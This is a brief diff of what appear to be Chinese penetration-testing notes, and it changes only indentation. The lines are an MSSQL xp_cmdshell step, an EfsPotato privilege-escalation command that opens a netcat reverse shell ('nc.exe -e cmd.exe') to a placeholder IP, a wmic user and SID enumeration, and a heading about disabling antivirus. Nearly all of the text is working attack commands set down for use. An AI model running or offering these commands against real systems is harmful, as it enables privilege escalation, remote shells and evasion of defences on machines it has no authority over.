@@ -30,13 +30,13 @@ ux******和He******都可以
                              
 --python3 mssqlclient.py-- 
 
-                              xp_cmdshell
+    xp_cmdshell
 
 
-./EfsPotato.exe 'nc.exe -e cmd.exe 10.10.xx.xx xxxx'
+    ./EfsPotato.exe 'nc.exe -e cmd.exe 10.10.xx.xx xxxx'
 
 
-wmic useraccount get name,sid
+    wmic useraccount get name,sid
 
 
 关AV：
